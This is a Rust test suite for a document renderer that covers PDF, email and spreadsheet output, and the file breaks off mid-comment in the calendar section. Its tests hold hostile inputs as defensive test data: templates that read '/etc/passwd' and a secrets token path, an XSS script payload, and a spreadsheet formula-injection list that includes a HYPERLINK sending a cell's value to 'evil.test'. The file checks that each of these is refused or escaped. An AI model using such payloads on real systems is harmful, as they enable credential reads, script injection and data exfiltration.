//! The proofs of spec 019 §7 for `local.document`.
//!
//! Each test is named after the row of the spec's table it discharges. The
//! subprocess helper at the bottom is what makes "including across processes
//! and after a restart" and "with the system font directories emptied" real
//! claims rather than restatements of the in-process double render that
//! registration already runs.

use std::alloc::{GlobalAlloc, Layout, System};
use std::cell::Cell;
use std::collections::{BTreeMap, BTreeSet};
use std::time::Duration;

use donat_connectors::local::document::{DocumentKind, DocumentTemplateSet, DocumentTemplateSpec};
use donat_connectors::local::{LocalContext, LocalOperation, LocalProduct, StopSignal, capability};
use donat_connectors::sdk::errors::ConnectorErrorClass;
use serde_json::{Value as JsonValue, json};
use sha2::{Digest, Sha256};

// ---------------------------------------------------------------------------
// A per-thread allocation counter
// ---------------------------------------------------------------------------
//
// The same instrument spec 022's image suite uses. A working-memory ceiling
// that is only consulted *after* the memory was allocated is not a ceiling, and
// a refusal code alone cannot tell the two apart — the peak can.

struct Counting;

thread_local! {
    static LIVE: Cell<isize> = const { Cell::new(0) };
    static PEAK: Cell<isize> = const { Cell::new(0) };
}

/// Charge or refund, without allocating: both cells are `const`-initialized, so
/// touching them from inside the allocator cannot recurse into it.
fn charge_bytes(delta: isize) {
    let _ = LIVE.try_with(|live| {
        let now = live.get() + delta;
        live.set(now);
        let _ = PEAK.try_with(|peak| {
            if now > peak.get() {
                peak.set(now);
            }
        });
    });
}

unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        let pointer = unsafe { System.alloc(layout) };
        if !pointer.is_null() {
            charge_bytes(layout.size() as isize);
        }
        pointer
    }

    unsafe fn dealloc(&self, pointer: *mut u8, layout: Layout) {
        charge_bytes(-(layout.size() as isize));
        unsafe { System.dealloc(pointer, layout) };
    }

    unsafe fn alloc_zeroed(&self, layout: Layout) -> *mut u8 {
        let pointer = unsafe { System.alloc_zeroed(layout) };
        if !pointer.is_null() {
            charge_bytes(layout.size() as isize);
        }
        pointer
    }

    unsafe fn realloc(&self, pointer: *mut u8, layout: Layout, new_size: usize) -> *mut u8 {
        let moved = unsafe { System.realloc(pointer, layout, new_size) };
        if !moved.is_null() {
            charge_bytes(new_size as isize - layout.size() as isize);
        }
        moved
    }
}

#[global_allocator]
static ALLOCATOR: Counting = Counting;

/// The most bytes this thread had live at once while `body` ran.
fn peak_bytes<T>(body: impl FnOnce() -> T) -> (T, usize) {
    let before = LIVE.with(Cell::get);
    PEAK.with(|peak| peak.set(before));
    let value = body();
    let peak = PEAK.with(Cell::get);
    (value, (peak - before).max(0) as usize)
}

// ---------------------------------------------------------------------------
// Shared fixtures
// ---------------------------------------------------------------------------

/// One template's declaration, with everything a renderer needs and nothing a
/// deployment could add at request time.
fn spec(
    name: &str,
    kind: DocumentKind,
    entry: &str,
    files: &[(&str, &str)],
) -> DocumentTemplateSpec {
    let files: BTreeMap<String, String> = files
        .iter()
        .map(|(path, text)| ((*path).to_owned(), (*text).to_owned()))
        .collect();
    DocumentTemplateSpec {
        name: name.to_owned(),
        kind: Some(kind),
        entry: entry.to_owned(),
        content_hash: hex(&Sha256::digest(
            files.values().cloned().collect::<String>().as_bytes(),
        )),
        files,
        ..Default::default()
    }
}

fn with_inputs(mut spec: DocumentTemplateSpec, inputs: &[&str]) -> DocumentTemplateSpec {
    spec.inputs = inputs.iter().map(|name| (*name).to_owned()).collect();
    spec
}

fn context(specs: Vec<DocumentTemplateSpec>) -> LocalContext {
    LocalContext::new(DocumentTemplateSet::resolve(specs).expect("the test templates resolve"))
}

fn operation(id: &str) -> &'static LocalOperation {
    capability("local.document")
        .expect("local.document is compiled into this binary")
        .admit_operation(id)
        .expect("the operation is declared and executable")
}

fn hex(bytes: &[u8]) -> String {
    use std::fmt::Write;
    bytes.iter().fold(String::new(), |mut out, byte| {
        let _ = write!(out, "{byte:02x}");
        out
    })
}

const INVOICE: &str = r#"#set page(width: 200pt, height: 140pt, margin: 10pt)
#set text(size: 9pt)
= Invoice #sys.inputs.order.number
Total: #sys.inputs.order.total
#datetime.today().display()
"#;

fn invoice_context() -> LocalContext {
    context(vec![with_inputs(
        spec(
            "invoice",
            DocumentKind::Pdf,
            "/invoice.typ",
            &[("/invoice.typ", INVOICE)],
        ),
        &["order"],
    )])
}

fn invoice_input() -> JsonValue {
    json!({
        "template": "invoice",
        "order": { "number": "A-1", "total": "12.50" },
        "document_id": "invoice:A-1",
        "document_timestamp": "2026-03-04T09:30:00Z",
        "attachment": "public.invoice.file",
        "claim_role": "app",
        "file_name": "invoice-A-1.pdf"
    })
}

/// Render one PDF and return its bytes.
fn render_pdf(context: &LocalContext, input: &JsonValue) -> Vec<u8> {
    match operation("pdf.render")
        .execute(input, context, None, &StopSignal::new())
        .expect("the fixture renders")
    {
        LocalProduct::Artifact { artifact, .. } => artifact.bytes().to_vec(),
        LocalProduct::Value(value) => panic!("pdf.render produces bytes, not {value}"),
    }
}

// ---------------------------------------------------------------------------
// PDF
// ---------------------------------------------------------------------------

/// Spec 019 §7 `pdf_render_is_deterministic`.
///
/// Two renders of one input are byte-identical — in this process, and in a
/// process started from scratch, which is what rules out a cache warmed by the
/// first render and a value carried over in a static.
#[test]
fn pdf_render_is_deterministic() {
    let context = invoice_context();
    let input = invoice_input();
    let first = render_pdf(&context, &input);
    let second = render_pdf(&context, &input);
    assert_eq!(first, second, "two renders of one input differ");
    assert!(
        first.starts_with(b"%PDF-"),
        "the artifact is a PDF, not a description of one"
    );

    // A different input is a different document: a test that only proves two
    // renders agree would pass on a renderer that returns a constant.
    let mut other = input.clone();
    other["order"]["number"] = json!("A-2");
    assert_ne!(render_pdf(&context, &other), first);

    // And the timestamp is the declared one: changing it changes the bytes,
    // which is what proves it was used rather than ignored.
    let mut later = input.clone();
    later["document_timestamp"] = json!("2026-03-05T09:30:00Z");
    assert_ne!(
        render_pdf(&context, &later),
        first,
        "the declared timestamp must reach the document"
    );

    // Across processes and after a restart.
    let here = hex(&Sha256::digest(&first));
    assert_eq!(
        subprocess_digest(&[]),
        here,
        "a freshly started process must produce the same bytes"
    );
}

/// Spec 019 §7 `pdf_world_denies_filesystem_and_packages`.
///
/// A template that imports a package, reads an absolute path, or escapes its
/// own file set fails at *load* — the deployment never starts with it — and the
/// world refuses the same things again at render for the paths a lexical check
/// cannot see.
#[test]
fn pdf_world_denies_filesystem_and_packages() {
    for (source, expected) in [
        ("#import \"@preview/cetz:0.3.0\": *\n", "package import"),
        ("#import \"@local/private:1.0.0\": *\n", "package import"),
        ("#include \"../../../etc/passwd\"\n", "leaves the template"),
        ("#let x = read(\"/etc/passwd\")\n", "does not declare"),
        ("#image(\"/var/run/secrets/token\")\n", "does not declare"),
    ] {
        let rejections = DocumentTemplateSet::resolve(vec![spec(
            "hostile",
            DocumentKind::Pdf,
            "/hostile.typ",
            &[("/hostile.typ", source)],
        )])
        .expect_err("a template that reaches outside its set must not resolve");
        assert!(
            rejections
                .iter()
                .any(|rejection| rejection.message.contains(expected)),
            "`{source}` must be refused at load for {expected}: {rejections:?}"
        );
    }

    // The render-time half. A path the template computes cannot be seen by the
    // load-time check, and the world has no answer for it either: there is no
    // filesystem behind `read`, only the frozen set.
    let computed = context(vec![with_inputs(
        spec(
            "computed",
            DocumentKind::Pdf,
            "/computed.typ",
            &[("/computed.typ", "#read(\"/\" + sys.inputs.path)\n")],
        ),
        &["path"],
    )]);
    let failure = operation("pdf.render")
        .execute(
            &json!({
                "template": "computed",
                "path": "etc/passwd",
                "document_id": "x",
                "document_timestamp": "2026-01-01T00:00:00Z",
                "attachment": "public.invoice.file",
                "claim_role": "app",
                "file_name": "x.pdf"
            }),
            &computed,
            None,
            &StopSignal::new(),
        )
        .expect_err("a computed path reaches nothing");
    assert_eq!(failure.code(), "local_template_compile_failed");

    // A file the template *did* declare is readable, so the refusal above is
    // the set's boundary and not a renderer that cannot read at all.
    let declared = context(vec![spec(
        "declared",
        DocumentKind::Pdf,
        "/declared.typ",
        &[
            (
                "/declared.typ",
                "#set page(width: 100pt, height: 60pt)\n#read(\"data/note.txt\")\n",
            ),
            ("/data/note.txt", "a declared file"),
        ],
    )]);
    assert!(
        render_pdf(
            &declared,
            &json!({
                "template": "declared",
                "document_id": "x",
                "document_timestamp": "2026-01-01T00:00:00Z",
                "attachment": "public.invoice.file",
                "claim_role": "app",
                "file_name": "x.pdf"
            })
        )
        .starts_with(b"%PDF-")
    );
}

/// Spec 019 §7 `pdf_uses_only_embedded_fonts`.
///
/// With the system font directories emptied, output is unchanged. A render is
/// run in a subprocess whose font environment points at an empty directory and
/// whose home has no fonts either; if any face came from the system, the bytes
/// would move.
#[test]
fn pdf_uses_only_embedded_fonts() {
    let baseline = hex(&Sha256::digest(render_pdf(
        &invoice_context(),
        &invoice_input(),
    )));
    let empty =
        std::env::temp_dir().join(format!("donat_no_fonts_{}_{}", std::process::id(), line!()));
    std::fs::create_dir_all(empty.join("fonts")).expect("an empty font root");
    let empty = empty.to_string_lossy().into_owned();
    assert_eq!(
        subprocess_digest(&[
            ("HOME", empty.as_str()),
            ("XDG_DATA_HOME", empty.as_str()),
            ("XDG_DATA_DIRS", empty.as_str()),
            ("XDG_CONFIG_HOME", empty.as_str()),
            ("FONTCONFIG_PATH", empty.as_str()),
            ("FONTCONFIG_FILE", empty.as_str()),
            ("TYPST_FONT_PATHS", empty.as_str()),
        ]),
        baseline,
        "a render with no system fonts reachable must be byte-identical"
    );
}

/// Spec 019 §7 `pdf_bounds_are_enforced`.
///
/// Page count, cpu deadline, and output size each fail with the correct class,
/// and no partial artifact comes back from any of them.
#[test]
fn pdf_bounds_are_enforced() {
    // 1. Pages. The template narrows the operation's own ceiling; a document
    //    that needs more than it declared is a `validation` refusal, because the
    //    same input will need the same pages next time.
    let mut narrow = with_inputs(
        spec(
            "invoice",
            DocumentKind::Pdf,
            "/invoice.typ",
            &[(
                "/invoice.typ",
                "#set page(width: 100pt, height: 60pt)\nfirst #pagebreak() second #pagebreak() third\n",
            )],
        ),
        &[],
    );
    narrow.max_pages = Some(1);
    let failure = operation("pdf.render")
        .execute(
            &json!({
                "template": "invoice",
                "document_id": "x",
                "document_timestamp": "2026-01-01T00:00:00Z",
                "attachment": "public.invoice.file",
                "claim_role": "app",
                "file_name": "x.pdf"
            }),
            &context(vec![narrow]),
            None,
            &StopSignal::new(),
        )
        .expect_err("three pages is two over a one-page ceiling");
    assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    assert_eq!(failure.code(), "local_units_exceeded");

    // 2. The deadline. What comes back is a timeout and nothing else.
    let failure = operation("pdf.render")
        .execute(
            &invoice_input(),
            &invoice_context(),
            Some(Duration::from_nanos(1)),
            &StopSignal::new(),
        )
        .expect_err("a render past its deadline produces nothing");
    assert_eq!(failure.class(), ConnectorErrorClass::Timeout);
    assert_eq!(failure.code(), "local_cpu_deadline_exceeded");

    // 3. The output ceiling, narrowed by the template.
    let mut small = with_inputs(
        spec(
            "invoice",
            DocumentKind::Pdf,
            "/invoice.typ",
            &[("/invoice.typ", INVOICE)],
        ),
        &["order"],
    );
    small.max_output_bytes = Some(512);
    let failure = operation("pdf.render")
        .execute(
            &invoice_input(),
            &context(vec![small]),
            None,
            &StopSignal::new(),
        )
        .expect_err("a PDF larger than the template's ceiling is refused");
    assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    assert_eq!(failure.code(), "local_output_too_large");

    // 4. A drained deployment: the same "nothing partial" answer, retryably.
    let stop = StopSignal::new();
    stop.stop();
    let failure = operation("pdf.render")
        .execute(&invoice_input(), &invoice_context(), None, &stop)
        .expect_err("a drained execution produces nothing");
    assert_eq!(failure.code(), "local_capability_drained");
}

/// A missing glyph is reported rather than swallowed: the character renders as
/// the font's own notdef and the activity output says which one it was.
#[test]
fn a_missing_glyph_is_reported_in_the_typed_warnings() {
    let context = invoice_context();
    let mut input = invoice_input();
    input["order"]["number"] = json!("発-1");
    let LocalProduct::Artifact { metadata, .. } = operation("pdf.render")
        .execute(&input, &context, None, &StopSignal::new())
        .expect("a document with an uncovered character still renders")
    else {
        panic!("pdf.render produces bytes");
    };
    assert_eq!(metadata["warnings"][0]["code"], "missing_glyphs");
    assert_eq!(metadata["warnings"][0]["characters"], json!(["発"]));

    // And the ordinary case says so too, rather than omitting the field.
    let LocalProduct::Artifact { metadata, .. } = operation("pdf.render")
        .execute(&invoice_input(), &context, None, &StopSignal::new())
        .expect("the fixture renders")
    else {
        panic!("pdf.render produces bytes");
    };
    assert_eq!(metadata["warnings"], json!([]));
    assert_eq!(metadata["pages"], json!(1));
    assert_eq!(metadata["template"], json!("invoice"));
}

// ---------------------------------------------------------------------------
// Email
// ---------------------------------------------------------------------------

const ORDER_EMAIL: &str = r#"<mjml><mj-body><mj-section><mj-column>
<mj-text>Hello {{ customer.name }}</mj-text>
<mj-text>{{ customer.signature }}</mj-text>
{{#if order.note}}<mj-text>Note: {{ order.note }}</mj-text>{{/if}}
{{#each order.lines}}<mj-text>{{ description }} x{{ quantity }}</mj-text>{{/each}}
</mj-column></mj-section></mj-body></mjml>"#;

/// The order-confirmation fixture, with exactly one path declared as HTML.
fn email_context() -> LocalContext {
    let mut template = with_inputs(
        spec(
            "order_confirmation",
            DocumentKind::Email,
            "/order.mjml",
            &[("/order.mjml", ORDER_EMAIL)],
        ),
        &["customer", "order"],
    );
    // What the metadata loader resolves from the declared types: `signature` is
    // the one field whose type is `Html`.
    template.html_paths = BTreeSet::from(["customer.signature".to_owned()]);
    context(vec![template])
}

fn email_input() -> JsonValue {
    json!({
        "template": "order_confirmation",
        "customer": {
            "name": "<script>alert('xss')</script>",
            "signature": "<em>Sent by donat</em>"
        },
        "order": {
            "note": "Ships & arrives Tuesday",
            "lines": [
                { "description": "Widget <small>", "quantity": 2 },
                { "description": "Gasket", "quantity": 1 }
            ]
        }
    })
}

fn render_email(context: &LocalContext, input: &JsonValue) -> JsonValue {
    match operation("email.render")
        .execute(input, context, None, &StopSignal::new())
        .expect("the fixture renders")
    {
        LocalProduct::Value(value) => value,
        LocalProduct::Artifact { .. } => panic!("email.render returns a typed pair, not a file"),
    }
}

/// A repeat is charged while it repeats, not after it has finished.
///
/// `{{#each}}` is the one form in this grammar that turns a bounded input into
/// an unbounded output: the list comes from the process and the body comes from
/// the template, and the product of the two is what gets written. The
/// interpolator only reaches a `checkpoint` where it finds a `{{`, so a body
/// with no placeholder in it — a table row of static markup, which is exactly
/// what a repeat is usually for — ran to the end of the list with nothing
/// charged and nothing observed. A 100 KiB input then produces eighty
/// megabytes against an eight-megabyte ceiling, and the ceiling only hears
/// about it once the eighty megabytes exist.
#[test]
fn an_email_repeat_is_charged_as_it_repeats() {
    // A body with no placeholder in it, so nothing inside the loop is a `{{`.
    let row = "<tr><td>".to_owned() + &"x".repeat(4_096) + "</td></tr>";
    let template = with_inputs(
        spec(
            "bulk",
            DocumentKind::Email,
            "/bulk.mjml",
            &[(
                "/bulk.mjml",
                &format!(
                    "<mjml><mj-body><mj-section><mj-column><mj-table>{{{{#each rows}}}}{row}\
                     {{{{/each}}}}</mj-table></mj-column></mj-section></mj-body></mjml>"
                ),
            )],
        ),
        &["rows"],
    );
    let context = context(vec![template]);
    let input = json!({
        "template": "bulk",
        "rows": vec![JsonValue::Null; 20_000],
    });

    let (failure, peak) = peak_bytes(|| {
        operation("email.render")
            .execute(&input, &context, None, &StopSignal::new())
            .expect_err("eighty megabytes of output is over the working-memory ceiling")
    });
    assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    assert_eq!(failure.code(), "local_intermediate_too_large");
    // The declared ceiling is 8 MiB. What is asserted is that the render is
    // stopped somewhere near it rather than after the whole product exists:
    // the string doubles as it grows, so twice the ceiling is the honest
    // headroom, and the unfixed reader peaks at ten times that.
    assert!(
        peak < 32 * 1_024 * 1_024,
        "a repeat must be charged as it repeats: {peak} bytes peaked against an 8 MiB ceiling"
    );

    // And the same template inside the ceiling still renders, so what is being
    // refused is the size and not the shape.
    let small = json!({ "template": "bulk", "rows": vec![JsonValue::Null; 8] });
    let rendered = render_email(&context, &small);
    assert_eq!(
        rendered["html"]
            .as_str()
            .expect("html is a string")
            .matches(&"x".repeat(4_096))
            .count(),
        8,
        "the repeat still writes one body per item"
    );
}

/// A template that outruns the budget is stopped, and a draining replica stops
/// waiting for one.
///
/// `typst::compile` observes neither: over a forty-second compile it touches
/// its `World` exactly once, so there is no callback, no sink, and no tracked
/// method a checkpoint could live in. Both of ADR 044's operational promises —
/// "the deadline is the one bound a retry can pass" and "the work observes the
/// signal and ends" — therefore have to be kept by somebody outside the
/// typesetter, and until they are, a `pdf.render` is a `start_to_close` a
/// process cannot enforce and a replica cannot drain.
#[test]
fn a_pdf_render_stops_at_its_deadline_and_when_drained() {
    // Nine million iterations of nothing, which is around twenty seconds of
    // this compiler. Typst's own per-loop ceiling is 10,000, so two nested
    // loops are all it takes to walk past it.
    const SLOW: &str = r#"#set page(width: 200pt, height: 140pt, margin: 10pt)
#let total = 0
#for i in range(3000) { for j in range(3000) { total = total + 1 } }
= #sys.inputs.subject #total
"#;
    let context = context(vec![with_inputs(
        spec(
            "slow",
            DocumentKind::Pdf,
            "/slow.typ",
            &[("/slow.typ", SLOW)],
        ),
        &["subject"],
    )]);
    let input = json!({
        "template": "slow",
        "subject": "donat",
        "document_id": "slow",
        "document_timestamp": "2026-03-04T09:30:00Z",
        "attachment": "public.invoice.file",
        "claim_role": "app",
        "file_name": "slow.pdf"
    });

    // The deadline. It is the activity's own budget, which is the smaller of
    // the two and the one a Process declares.
    let started = std::time::Instant::now();
    let failure = operation("pdf.render")
        .execute(
            &input,
            &context,
            Some(Duration::from_millis(200)),
            &StopSignal::new(),
        )
        .expect_err("a template that outruns its budget does not produce a document");
    assert_eq!(failure.class(), ConnectorErrorClass::Timeout);
    assert_eq!(failure.code(), "local_cpu_deadline_exceeded");
    assert!(
        started.elapsed() < Duration::from_secs(8),
        "the deadline was reported after {:?}, which is the compile finishing rather than the \
         deadline being observed",
        started.elapsed()
    );

    // The drain. `StopSignal` is the deployment's shutdown token as a running
    // capability sees it, and a render that cannot see it is a render a
    // rolling deployment waits out.
    let stop = StopSignal::new();
    std::thread::spawn({
        let stop = stop.clone();
        move || {
            std::thread::sleep(Duration::from_millis(200));
            stop.stop();
        }
    });
    let started = std::time::Instant::now();
    let failure = operation("pdf.render")
        .execute(&input, &context, None, &stop)
        .expect_err("a drained render produces nothing");
    assert_eq!(failure.class(), ConnectorErrorClass::Timeout);
    assert_eq!(failure.code(), "local_capability_drained");
    assert!(
        started.elapsed() < Duration::from_secs(8),
        "the drain was reported after {:?}",
        started.elapsed()
    );
}

/// Spec 019 §7 `email_render_escapes_by_default`.
///
/// A scripting payload in a typed string field appears escaped; an explicitly
/// declared HTML field does not double-escape.
#[test]
fn email_render_escapes_by_default() {
    let rendered = render_email(&email_context(), &email_input());
    let html = rendered["html"].as_str().expect("html is a string");

    assert!(
        !html.contains("<script>alert('xss')</script>"),
        "an undeclared string must not reach the message as markup"
    );
    assert!(
        html.contains("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"),
        "the payload appears escaped, character for character"
    );
    assert!(
        html.contains("Ships &amp; arrives Tuesday"),
        "an ampersand in ordinary text is escaped too"
    );
    assert!(
        html.contains("Widget &lt;small&gt;"),
        "a value inside a repeat is escaped by the same rule"
    );

    // The declared HTML field goes in as markup and is not escaped twice.
    assert!(
        html.contains("<em>Sent by donat</em>"),
        "a field declared as HTML reaches the message as markup"
    );
    assert!(
        !html.contains("&lt;em&gt;"),
        "a declared HTML field must not be escaped at all"
    );

    // The exemption is a property of the declaration, not of the value: the
    // same markup in an undeclared field is escaped.
    let mut swapped = email_input();
    swapped["customer"]["name"] = json!("<em>not declared</em>");
    let html = render_email(&email_context(), &swapped);
    let html = html["html"].as_str().expect("html is a string");
    assert!(html.contains("&lt;em&gt;not declared&lt;/em&gt;"));
}

/// Spec 019 §7 `email_render_produces_text_alternative`.
///
/// The plain-text part is present and derived from the same data.
#[test]
fn email_render_produces_text_alternative() {
    let rendered = render_email(&email_context(), &email_input());
    let text = rendered["text"].as_str().expect("text is a string");

    assert!(!text.is_empty(), "the plain-text part is present");
    // No markup of the message's own: the `<` that survives is the escaped
    // payload turned back into the characters a customer actually typed, which
    // is what a plain-text part is for.
    for markup in ["<div", "<table", "<td", "<style", "<!--", "<html"] {
        assert!(
            !text.contains(markup),
            "the plain-text part carries no markup ({markup}): {text}"
        );
    }
    // The same data, from the same render: the escaped payload is text again,
    // the declared HTML field's words survive without its tags, and the repeat
    // produced both rows.
    assert!(text.contains("<script>alert('xss')</script>"), "{text}");
    assert!(text.contains("Sent by donat"), "{text}");
    assert!(text.contains("Ships & arrives Tuesday"), "{text}");
    assert!(text.contains("Widget <small> x2"), "{text}");
    assert!(text.contains("Gasket x1"), "{text}");

    // A declared optional block that is absent produces nothing in either part.
    let mut without = email_input();
    without["order"]["note"] = JsonValue::Null;
    let rendered = render_email(&email_context(), &without);
    assert!(!rendered["text"].as_str().unwrap().contains("Note:"));
    assert!(!rendered["html"].as_str().unwrap().contains("Note:"));
}

/// The template is not a language: anything beyond the three declared forms,
/// and any path the activity did not bind, is refused.
#[test]
fn an_email_template_interpolates_only_declared_values() {
    for (source, code) in [
        (
            "<mjml><mj-body>{{ order.secret }}</mj-body></mjml>",
            "local_template_input_missing",
        ),
        (
            "<mjml><mj-body>{{#with order}}x{{/with}}</mj-body></mjml>",
            "local_input_contract",
        ),
        (
            "<mjml><mj-body>{{ order.lines }}</mj-body></mjml>",
            "local_template_input_kind",
        ),
        (
            "<mjml><mj-body>{{#each order.note}}x{{/each}}</mj-body></mjml>",
            "local_template_input_kind",
        ),
        (
            "<mjml><mj-body>{{ order.number</mj-body></mjml>",
            "local_input_contract",
        ),
    ] {
        let template = with_inputs(
            spec(
                "probe",
                DocumentKind::Email,
                "/probe.mjml",
                &[("/probe.mjml", source)],
            ),
            &["order"],
        );
        let failure = operation("email.render")
            .execute(
                &json!({ "template": "probe", "order": { "note": "n", "lines": [] } }),
                &context(vec![template]),
                None,
                &StopSignal::new(),
            )
            .expect_err("only the three declared forms render");
        assert_eq!(failure.code(), code, "for `{source}`");
        assert_eq!(failure.class(), ConnectorErrorClass::Validation);
    }
}

// ---------------------------------------------------------------------------
// Spreadsheet
// ---------------------------------------------------------------------------

const ORDERS_SHEET: &str = r#"{
  "sheet": "Orders",
  "columns": [
    { "header": "Number",   "field": "number",    "type": "text" },
    { "header": "Placed",   "field": "placed_at", "type": "date" },
    { "header": "Quantity", "field": "quantity",  "type": "integer" },
    { "header": "Total",    "field": "total",     "type": "decimal" },
    { "header": "Paid",     "field": "paid",      "type": "boolean" }
  ]
}"#;

fn sheet_context() -> LocalContext {
    context(vec![with_inputs(
        spec(
            "orders",
            DocumentKind::Spreadsheet,
            "/orders.json",
            &[("/orders.json", ORDERS_SHEET)],
        ),
        &["rows"],
    )])
}

fn sheet_input(rows: JsonValue) -> JsonValue {
    json!({
        "template": "orders",
        "rows": rows,
        "document_timestamp": "2026-03-04T09:30:00Z",
        "attachment": "public.export.file",
        "claim_role": "app",
        "file_name": "orders.xlsx"
    })
}

fn render_sheet(input: &JsonValue) -> Vec<u8> {
    match operation("spreadsheet.render")
        .execute(input, &sheet_context(), None, &StopSignal::new())
        .expect("the fixture renders")
    {
        LocalProduct::Artifact { artifact, .. } => artifact.bytes().to_vec(),
        LocalProduct::Value(value) => panic!("spreadsheet.render produces bytes, not {value}"),
    }
}

/// One entry of the produced workbook, as text.
fn workbook_part(bytes: &[u8], name: &str) -> String {
    let mut archive =
        zip::ZipArchive::new(std::io::Cursor::new(bytes)).expect("the artifact is a ZIP");
    let mut part = archive.by_name(name).expect("the part is in the workbook");
    let mut text = String::new();
    std::io::Read::read_to_string(&mut part, &mut text).expect("the part is text");
    text
}

/// Spec 019 §7 `spreadsheet_types_survive`.
///
/// Numbers, dates, and decimals are typed cells, not strings; decimal precision
/// is preserved exactly, and a decimal a cell cannot hold exactly is refused
/// rather than rounded behind the operator's back.
#[test]
fn spreadsheet_types_survive() {
    let bytes = render_sheet(&sheet_input(json!([
        { "number": "A-1", "placed_at": "2026-03-04", "quantity": 2, "total": "12.50", "paid": true },
        { "number": "A-2", "placed_at": "2026-03-05", "quantity": 11, "total": "1234567.89", "paid": false }
    ])));
    let sheet = workbook_part(&bytes, "xl/worksheets/sheet1.xml");

    // A text cell is a string cell; every other declared type is a typed cell
    // with no string marker on it at all.
    assert!(
        sheet.contains(r#"<c r="A2" t="s">"#),
        "the text column is a string cell: {sheet}"
    );
    // The date is an Excel serial number, which is what makes it sort and
    // filter as a date rather than as the characters "2026-03-04"; the
    // formatted columns carry a style index, and the integer needs none.
    for (reference, value) in [("B2", "46085"), ("D2", "12.5")] {
        assert!(
            sheet.contains(&format!("<c r=\"{reference}\" s=\"")),
            "{reference} is a formatted cell: {sheet}"
        );
        assert!(
            sheet.contains(&format!("<v>{value}</v>")),
            "{reference} holds {value}: {sheet}"
        );
    }
    assert!(
        sheet.contains(r#"<c r="C2"><v>2</v></c>"#),
        "the integer column is a bare number cell: {sheet}"
    );
    assert!(
        sheet.contains(r#"<c r="E2" t="b"><v>1</v></c>"#),
        "the boolean column is a boolean cell: {sheet}"
    );

    // Decimal precision, exactly: the value stored is the value given.
    assert!(sheet.contains("<v>1234567.89</v>"), "{sheet}");

    // And a decimal a double cannot hold is refused rather than rounded.
    let failure = operation("spreadsheet.render")
        .execute(
            &sheet_input(json!([{ "number": "A-3", "total": "123456789012345678.99" }])),
            &sheet_context(),
            None,
            &StopSignal::new(),
        )
        .expect_err("a decimal a cell cannot hold exactly is not written");
    assert_eq!(failure.code(), "local_decimal_not_representable");
    assert_eq!(failure.class(), ConnectorErrorClass::Validation);

    // A value whose kind does not match its column is refused too: a typed
    // column that quietly accepted a string would be the CSV export again.
    let failure = operation("spreadsheet.render")
        .execute(
            &sheet_input(json!([{ "number": "A-4", "quantity": "many" }])),
            &sheet_context(),
            None,
            &StopSignal::new(),
        )
        .expect_err("a string is not an integer");
    assert_eq!(failure.code(), "local_template_input_kind");
}

/// Spec 019 §7 `spreadsheet_rejects_formula_injection`.
///
/// A value starting with `=`, `+`, `-`, or `@` is written inert: a string cell,
/// which is never evaluated, carrying a defensive prefix that survives a
/// copy-paste out of the recipient's application, where the cell type does not.
#[test]
fn spreadsheet_rejects_formula_injection() {
    let payloads = [
        "=1+1",
        "=HYPERLINK(\"http://evil.test?\"&A1,\"click\")",
        "+1+1",
        "-1+1",
        "@SUM(A1:A9)",
        "\t=1+1",
    ];
    let rows: Vec<JsonValue> = payloads
        .iter()
        .map(|payload| json!({ "number": payload, "quantity": 1 }))
        .collect();
    let bytes = render_sheet(&sheet_input(JsonValue::Array(rows)));
    let sheet = workbook_part(&bytes, "xl/worksheets/sheet1.xml");
    let strings = workbook_part(&bytes, "xl/sharedStrings.xml");

    assert!(
        !sheet.contains("<f>"),
        "the workbook contains no formula cell at all: {sheet}"
    );
    for payload in payloads {
        // The stored value is the payload with the defensive prefix in front
        // of it, so nothing downstream sees a leading `=`.
        let stored = format!("'{payload}").replace('&', "&amp;");
        assert!(
            strings.contains(&stored),
            "`{payload}` must be stored inert as `{stored}`: {strings}"
        );
    }
    // Every cell of the column is a string cell; a string cell is never
    // evaluated, which is the half a prefix alone would not give.
    for row in 2..=payloads.len() + 1 {
        assert!(
            sheet.contains(&format!("<c r=\"A{row}\" t=\"s\">")),
            "A{row} is a string cell: {sheet}"
        );
    }

    // An ordinary value is untouched: a defence that mangles every export is
    // one an operator turns off.
    let bytes = render_sheet(&sheet_input(json!([
        { "number": "A-1", "quantity": 1 },
        { "number": "customer@example.test", "quantity": 1 }
    ])));
    let strings = workbook_part(&bytes, "xl/sharedStrings.xml");
    assert!(strings.contains("<t>A-1</t>"), "{strings}");
    assert!(
        strings.contains("<t>customer@example.test</t>"),
        "an `@` that is not leading is not a formula: {strings}"
    );
}

/// A workbook is a ZIP with a creation time in it, so the declared timestamp is
/// what keeps two renders of one input byte-identical.
#[test]
fn spreadsheet_render_is_deterministic() {
    let input = sheet_input(json!([{ "number": "A-1", "quantity": 1, "total": "12.50" }]));
    assert_eq!(render_sheet(&input), render_sheet(&input));

    let mut later = input.clone();
    later["document_timestamp"] = json!("2026-03-05T09:30:00Z");
    assert_ne!(
        render_sheet(&later),
        render_sheet(&input),
        "the declared timestamp must reach the workbook's properties"
    );
}

/// A layout that declares a formula column is refused: the operation has no
/// formula field, and a declaration the runtime ignores is a defect.
#[test]
fn a_spreadsheet_layout_declares_no_formula() {
    let template = with_inputs(
        spec(
            "orders",
            DocumentKind::Spreadsheet,
            "/orders.json",
            &[(
                "/orders.json",
                r#"{"sheet":"S","columns":[{"header":"T","field":"t","type":"decimal","formula":"=SUM(A:A)"}]}"#,
            )],
        ),
        &["rows"],
    );
    let failure = operation("spreadsheet.render")
        .execute(
            &sheet_input(json!([])),
            &context(vec![template]),
            None,
            &StopSignal::new(),
        )
        .expect_err("a formula column is not a column");
    assert_eq!(failure.code(), "local_template_formula_declared");
}

// ---------------------------------------------------------------------------
// Calendar
// ---------------------------------------------------------------------------

const DELIVERIES: &str =
    r#"{"product_id":"-//donat//deliveries//EN","method":"REQUEST","name":"Deliveries"}"#;

fn calendar_context() -> LocalContext {
    context(vec![with_inputs(
        spec(
            "deliveries",
            DocumentKind::Calendar,
            "/deliveries.json",
            &[("/deliveries.json", DELIVERIES)],
        ),
        &["events"],
    )])
}

fn calendar_input(events: JsonValue) -> JsonValue {
    json!({
        "template": "deliveries",
        "document_timestamp": "2026-03-04T09:30:00Z",
        "events": events
    })
}

/// The refusal code of a calendar render that must not have produced anything.
///
/// It panics with the calendar itself when a render succeeds, so a passing
